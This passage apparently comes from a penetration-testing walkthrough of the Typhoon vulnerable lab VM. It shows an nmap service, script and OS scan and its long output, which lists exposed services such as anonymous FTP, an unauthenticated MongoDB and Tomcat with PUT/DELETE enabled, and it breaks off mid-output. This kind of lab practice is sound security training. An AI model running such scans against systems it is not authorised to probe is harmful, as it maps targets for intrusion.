class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p21,22,25,53,80,110,111,139,143,445,631,993,995,2049,3306,5432,6379,8080,27017,34114,34329,41559,43004,49357 192.168.56.121<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-01 11:48 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.121<br>Host is up (0.00030s latency).<br><br>PORT      STATE SERVICE     VERSION<br>21/tcp    open  ftp         vsftpd 3.0.2<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to 192.168.56.106<br>|      Logged <span class="hljs-keyword">in</span> as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 3<br>|      vsFTPd 3.0.2 - secure, fast, stable<br>|_End of status<br>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 02:<span class="hljs-built_in">df</span>:b3:1b:01:dc:5e:fd:f9:96:d7:5b:b7:d6:7b:f9 (DSA)<br>|   2048 de:af:76:27:90:2a:8f:cf:0b:2f:22:f8:42:36:07:<span class="hljs-built_in">dd</span> (RSA)<br>|   256 70:ae:36:6c:42:7d:ed:1b:c0:40:<span class="hljs-built_in">fc</span>:2d:00:8d:87:11 (ECDSA)<br>|_  256 bb:ce:f2:98:64:f7:8f:ae:f0:<span class="hljs-built_in">dd</span>:3c:23:3b:a6:0f:61 (ED25519)<br>25/tcp    open  smtp        Postfix smtpd<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>|_smtp-commands: typhoon, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN<br>| ssl-cert: Subject: commonName=typhoon<br>| Not valid before: 2018-10-22T19:38:20<br>|_Not valid after:  2028-10-19T19:38:20<br>53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)<br>| dns-nsid: <br>|_  bind.version: 9.9.5-3-Ubuntu<br>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))<br>|_http-title: Typhoon Vulnerable VM by PRISMA CSI<br>| http-robots.txt: 1 disallowed entry <br>|_/mongoadmin/<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>110/tcp   open  pop3        Dovecot pop3d<br>|_pop3-capabilities: TOP RESP-CODES UIDL SASL STLS PIPELINING CAPA AUTH-RESP-CODE<br>| ssl-cert: Subject: commonName=typhoon/organizationName=Dovecot mail server<br>| Not valid before: 2018-10-22T19:38:49<br>|_Not valid after:  2028-10-21T19:38:49<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>111/tcp   open  rpcbind     2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100003  2,3,4       2049/tcp   nfs<br>|   100003  2,3,4       2049/tcp6  nfs<br>|   100003  2,3,4       2049/udp   nfs<br>|   100003  2,3,4       2049/udp6  nfs<br>|   100005  1,2,3      43189/tcp6  mountd<br>|   100005  1,2,3      47958/udp   mountd<br>|   100005  1,2,3      49357/tcp   mountd<br>|   100005  1,2,3      58024/udp6  mountd<br>|   100021  1,3,4      41979/tcp6  nlockmgr<br>|   100021  1,3,4      43004/tcp   nlockmgr<br>|   100021  1,3,4      56771/udp   nlockmgr<br>|   100021  1,3,4      57546/udp6  nlockmgr<br>|   100024  1          34114/tcp   status<br>|   100024  1          42529/udp6  status<br>|   100024  1          51309/tcp6  status<br>|   100024  1          58257/udp   status<br>|   100227  2,3         2049/tcp   nfs_acl<br>|   100227  2,3         2049/tcp6  nfs_acl<br>|   100227  2,3         2049/udp   nfs_acl<br>|_  100227  2,3         2049/udp6  nfs_acl<br>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>143/tcp   open  imap        Dovecot imapd (Ubuntu)<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>|_imap-capabilities: more STARTTLS LITERAL+ IMAP4rev1 post-login have listed LOGIN-REFERRALS OK capabilities Pre-login ENABLE LOGINDISABLEDA0001 IDLE SASL-IR ID<br>| ssl-cert: Subject: commonName=typhoon/organizationName=Dovecot mail server<br>| Not valid before: 2018-10-22T19:38:49<br>|_Not valid after:  2028-10-21T19:38:49<br>445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)<br>631/tcp   open  ipp         CUPS 1.7<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-server-header: CUPS/1.7 IPP/2.1<br>| http-methods: <br>|_  Potentially risky methods: PUT<br>|_http-title: Home - CUPS 1.7.2<br>993/tcp   open  ssl/imap    Dovecot imapd (Ubuntu)<br>|_imap-capabilities: more AUTH=PLAINA0001 IMAP4rev1 post-login have listed LOGIN-REFERRALS OK capabilities Pre-login ENABLE ID IDLE SASL-IR LITERAL+<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>| ssl-cert: Subject: commonName=typhoon/organizationName=Dovecot mail server<br>| Not valid before: 2018-10-22T19:38:49<br>|_Not valid after:  2028-10-21T19:38:49<br>995/tcp   open  ssl/pop3    Dovecot pop3d<br>| ssl-cert: Subject: commonName=typhoon/organizationName=Dovecot mail server<br>| Not valid before: 2018-10-22T19:38:49<br>|_Not valid after:  2028-10-21T19:38:49<br>|_pop3-capabilities: TOP RESP-CODES UIDL SASL(PLAIN) USER PIPELINING CAPA AUTH-RESP-CODE<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>2049/tcp  open  nfs         2-4 (RPC <span class="hljs-comment">#100003)</span><br>3306/tcp  open  mysql       MySQL (unauthorized)<br>5432/tcp  open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5<br>| ssl-cert: Subject: commonName=typhoon<br>| Not valid before: 2018-10-22T19:38:20<br>|_Not valid after:  2028-10-19T19:38:20<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>6379/tcp  open  redis       Redis key-value store 4.0.11<br>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1<br>|_http-open-proxy: Proxy might be redirecting requests<br>| http-methods: <br>|_  Potentially risky methods: PUT DELETE<br>|_http-title: Apache Tomcat<br>|_http-server-header: Apache-Coyote/1.1<br>27017/tcp open  mongodb     MongoDB 3.0.15 3.0.15<br>| mongodb-info: <br>|   MongoDB Build info<br>|     OpenSSLVersion = OpenSSL 1.0.1f 6 Jan 2014<br>|     loaderFlags = <br>|     bits = 64<br>|     ok = 1.0<br>|     versionArray<br>|       3 = 0<br>|       0 = 3<br>|       1 = 0<br>|       2 = 15<br>|     allocator = tcmalloc<br>|     maxBsonObjectSize = 16777216<br>|     compilerFlags = -Wnon-virtual-dtor -Woverloaded-virtual -std=c++11 -fno-omit-frame-pointer -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -pipe -Werror -O3 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fno-builtin-memcmp -std=c99<br>|     debug = <span class="hljs-literal">false</span><br>|     javascriptEngine = V8<br>|     version = 3.0.15<br>|     gitVersion = b8ff507269c382bc100fc52f75f48d54cd42ec3b<br>|     sysInfo = Linux ip-10-71-195-23 3.13.0-24-generic <span class="hljs-comment">#46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49</span><br>|   Server status<br>|     ok = 1.0<br>|     cursors<br>|       timedOut = 0<br>|       totalOpen = 0<br>|       pinned = 0<br>|       totalNoTimeout = 0<br>|       clientCursors_size = 0<br>|       note = deprecated, use server status metrics<br>|     process = mongod<br>|     uptimeMillis = 356783<br>|     extra_info<br>|       heap_usage_bytes = 63081592<br>|       page_faults = 171<br>|       note = fields vary by platform<br>|     globalLock<br>|       activeClients<br>|         writers = 0<br>|         total = 10<br>|         readers = 0<br>|       currentQueue<br>|         writers = 0<br>|         total = 0<br>|         readers = 0<br>|       totalTime = 356773000<br>|     connections<br>|       totalCreated = 4<br>|       available = 51198<br>|       current = 2<br>|     locks<br>|       Database<br>|         acquireCount<br>|           W = 9<br>|           r = 646<br>|           R = 2<br>|       MMAPV1Journal<br>|         acquireCount<br>|           w = 22<br>|           R = 3287<br>|           r = 646<br>|       Global<br>|         timeAcquiringMicros<br>|           r = 1025<br>|         acquireCount<br>|           w = 9<br>|           W = 5<br>|           r = 1310<br>|         acquireWaitCount<br>|           r = 1<br>|       Collection<br>|         acquireCount<br>|           R = 669<br>|     dur<br>|       journaledMB = 0.0<br>|       timeMs<br>|         writeToDataFiles = 0<br>|         prepLogBuffer = 0<br>|         remapPrivateView = 0<br>|         commits = 0<br>|         dt = 3040<br>|         writeToJournal = 0<br>|         commitsInWriteLock = 0<br>|       commits = 28<br>|       compression = 0.0<br>|       writeToDataFilesMB = 0.0<br>|       earlyCommits = 0<br>|       commitsInWriteLock = 0<br>|     writeBacksQueued = <span class="hljs-literal">false</span><br>|     mem<br>|       resident = 67<br>|       supported = <span class="hljs-literal">true</span><br>|       mappedWithJournal = 320<br>|       bits = 64<br>|       virtual = 515<br>|       mapped = 160<br>|     pid = 1312<br>|     uptimeEstimate = 298.0<br>|     metrics<br>|       repl<br>|         apply<br>|           ops = 0<br>|           batches<br>|             totalMillis = 0<br>|             num = 0<br>|         preload<br>|           indexes<br>|             totalMillis = 0<br>|             num = 0<br>|           docs<br>|             totalMillis = 0<br>|             num = 0<br>|         buffer<br>|           count = 0<br>|           sizeBytes = 0<br>|           maxSizeBytes = 268435456<br>|         network<br>|           readersCreated = 0<br>|           ops = 0<br>|           bytes = 0<br>|           getmores<br>|             totalMillis = 0<br>|             num = 0<br>|       cursor<br>|         open<br>|           noTimeout = 0<br>|           total = 0<br>|           pinned = 0<br>|         timedOut = 0<br>|       ttl<br>|         deletedDocuments = 0<br>|         passes = 5<br>|       queryExecutor<br>|         scanned = 0<br>|         scannedObjects = 0<br>|       getLastError<br>|         wtimeouts = 0<br>|         wtime<br>|           totalMillis = 0<br>|           num = 0<br>|       commands<br>|         _isSelf<br>|           failed = 0<br>|           total = 0<br>|         grantRolesToRole<br>|           failed = 0<br>|           total = 0<br>|         findAndModify<br>|           failed = 0<br>|           total = 0<br>|         buildInfo<br>|           failed = 0<br>|           total = 0<br>|         getPrevError<br>|           failed = 0<br>|           total = 0<br>|         copydb<br>|           failed = 0<br>|           total = 0<br>|         copydbsaslstart<br>|           failed = 0<br>|           total = 0<br>|         explain<br>|           failed = 0<br>|           total = 0<br>|         connectionStatus<br>|           failed = 0<br>|           total = 0<br>|         shardingState<br>|           failed = 0<br>|           total = 0<br>|         rolesInfo<br>|           failed = 0<br>|           total = 0<br>|         mergeChunks<br>|           failed = 0<br>|           total = 0<br>|         _getUserCacheGeneration<br>|           failed = 0<br>|           total = 0<br>|         revokeRolesFromUser<br>|           failed = 0<br>|           total = 0<br>|         dropAllUsersFromDatabase<br>|           failed = 0<br>|           total = 0<br>|         applyOps<br>|           failed = 0<br>|           total = 0<br>|         replSetFreeze<br>|           failed = 0<br>|           total = 0<br>|         moveChunk<br>|           failed = 0<br>|           total = 0<br>|         group<br>|           failed = 0<br>|           total = 0<br>|         logRotate<br>|           failed = 0<br>|           total = 0<br>|         currentOpCtx<br>|           failed = 0<br>|           total = 0<br>|         dropUser<br>|           failed = 0<br>|           total = 0<br>|         writebacklisten<br>|           failed = 0<br>|           total = 0<br>|         serverStatus<br>|           failed = 0<br>|           total = 2<br>|         replSetSyncFrom<br>|           failed = 0<br>|           total = 0<br>|         authSchemaUpgrade<br>|           failed = 0<br>|           total = 0<br>|         geoNear<br>|           failed = 0<br>|           total = 0<br>|         insert<br>|           failed = 0<br>|           total = 0<br>|         connPoolStats<br>|           failed = 0<br>|           total = 0<br>|         cloneCollectionAsCapped<br>|           failed = 0<br>|           total = 0<br>|         getParameter<br>|           failed = 0<br>|           total = 0<br>|         saslContinue<br>|           failed = 0<br>|           total = 0<br>|         grantPrivilegesToRole<br>|           failed = 0<br>|           total = 0<br>|         usersInfo<br>|           failed = 0<br>|           total = 0<br>|         forceerror<br>|           failed = 0<br>|           total = 0<br>|         dataSize<br>|           failed = 0<br>|           total = 0<br>|         <span class="hljs-built_in">touch</span><br>|           failed = 0<br>|           total = 0<br>|         replSetInitiate<br>|           failed = 0<br>|           total = 0<br>|         repairDatabase<br>|           failed = 0<br>|           total = 0<br>|         planCacheClear<br>|           failed = 0<br>|           total = 0<br>|         availableQueryOptions<br>|           failed = 0<br>|           total = 0<br>|         repairCursor<br>|           failed = 0<br>|           total = 0<br>|         drop<br>|           failed = 0<br>|           total = 0<br>|         copydbgetnonce<br>|           failed = 0<br>|           total = 0<br>|         replSetUpdatePosition<br>|           failed = 0<br>|           total = 0<br>|         updateRole<br>|           failed = 0<br>|           total = 0<br>|         dropAllRolesFromDatabase<br>|           failed = 0<br>|           total = 0<br>|         appendOplogNote<br>|           failed = 0<br>|           total = 0<br>|         setParameter<br>|           failed = 0<br>|           total = 0<br>|         getShardVersion<br>|           failed = 0<br>|           total = 0<br>|         top<br>|           failed = 0<br>|           total = 0<br>|         setShardVersion<br>|           failed = 0<br>|           total = 0<br>|         dropDatabase<br>|           failed = 0<br>|           total = 0<br>|         updateUser<br>|           failed = 0<br>|           total = 0<br>|         listCollections<br>|           failed = 0<br>|           total = 0<br>|         _recvChunkAbort<br>|           failed = 0<br>|           total = 0<br>|         replSetHeartbeat<br>|           failed = 0<br>|           total = 0<br>|         revokePrivilegesFromRole<br>|           failed = 0<br>|           total = 0<br>|         planCacheSetFilter<br>|           failed = 0<br>|           total = 0<br>|         replSetStepDown<br>|           failed = 0<br>|           total = 0<br>|         getnonce<br>|           failed = 0<br>|           total = 0<br>|         createIndexes<br>|           failed = 0<br>|           total = 0<br>|         getCmdLineOpts<br>|           failed = 0<br>|           total = 0<br>|         planCacheListQueryShapes<br>|           failed = 0<br>|           total = 0<br>|         getLog<br>|           failed = 0<br>|           total = 0<br>|         replSetElect<br>|           failed = 0<br>|           total = 0<br>|         planCacheClearFilters<br>|           failed = 0<br>|           total = 0<br>|         <span class="hljs-built_in">clone</span><br>|           failed = 0<br>|           total = 0<br>|         &lt;UNKNOWN&gt; = 0<br>|         parallelCollectionScan<br>|           failed = 0<br>|           total = 0<br>|         dbStats<br>|           failed = 0<br>|           total = 0<br>|         dropIndexes<br>|           failed = 0<br>|           total = 0<br>|         splitChunk<br>|           failed = 0<br>|           total = 0<br>|         _migrateClone<br>|           failed = 0<br>|           total = 0<br>|         connPoolSync<br>|           failed = 0<br>|           total = 0<br>|         saslStart<br>|           failed = 0<br>|           total = 0<br>|         delete<br>|           failed = 0<br>|           total = 0<br>|         find<br>|           failed = 0<br>|           total = 0<br>|         replSetGetRBID<br>|           failed = 0<br>|           total = 0<br>|         shutdown<br>|           failed = 0<br>|           total = 0<br>|         whatsmyuri<br>|           failed = 0<br>|           total = 0<br>|         ping<br>|           failed = 0<br>|           total = 0<br>|         mapreduce<br>|           shardedfinish<br>|             failed = 0<br>|             total = 0<br>|         handshake<br>|           failed = 0<br>|           total = 0<br>|         invalidateUserCache<br>|           failed = 0<br>|           total = 0<br>|         unsetSharding<br>|           failed = 0<br>|           total = 0<br>|         create<br>|           failed = 0<br>|           total = 0<br>|         <span class="hljs-built_in">logout</span><br>|           failed = 0<br>|           total = 0<br>|         hostInfo<br>|           failed = 0<br>|           total = 0<br>|         count<br>|           failed = 0<br>|           total = 0<br>|         replSetMaintenance<br>|           failed = 0<br>|           total = 0<br>|         reIndex<br>|           failed = 0<br>|           total = 0<br>|         splitVector<br>|           failed = 0<br>|           total = 0<br>|         <span class="hljs-built_in">eval</span><br>|           failed = 0<br>|           total = 0<br>|         update<br>|           failed = 0<br>|           total = 0<br>|         listDatabases<br>|           failed = 0<br>|           total = 1<br>|         planCacheListPlans<br>|           failed = 0<br>|           total = 0<br>|         createRole<br>|           failed = 0<br>|           total = 0<br>|         cursorInfo<br>|           failed = 0<br>|           total = 0<br>|         validate<br>|           failed = 0<br>|           total = 0<br>|         resetError<br>|           failed = 0<br>|           total = 0<br>|         mapReduce<br>|           failed = 0<br>|           total = 0<br>|         isMaster<br>|           failed = 0<br>|           total = 0<br>|         listCommands<br>|           failed = 0<br>|           total = 0<br>|         _transferMods<br>|           failed = 0<br>|           total = 0<br>|         filemd5<br>|           failed = 0<br>|           total = 0<br>|         profile<br>|           failed = 0<br>|           total = 0<br>|         replSetGetConfig<br>|           failed = 0<br>|           total = 0<br>|         createUser<br>|           failed = 0<br>|           total = 0<br>|         collMod<br>|           failed = 0<br>|           total = 0<br>|         diagLogging<br>|           failed = 0<br>|           total = 0<br>|         medianKey<br>|           failed = 0<br>|           total = 0<br>|         dbHash<br>|           failed = 0<br>|           total = 0<br>|         driverOIDTest<br>|           failed = 0<br>|           total = 0<br>|         replSetReconfig<br>|           failed = 0<br>|           total = 0<br>|         _recvChunkStatus<br>|           failed = 0<br>|           total = 0<br>|         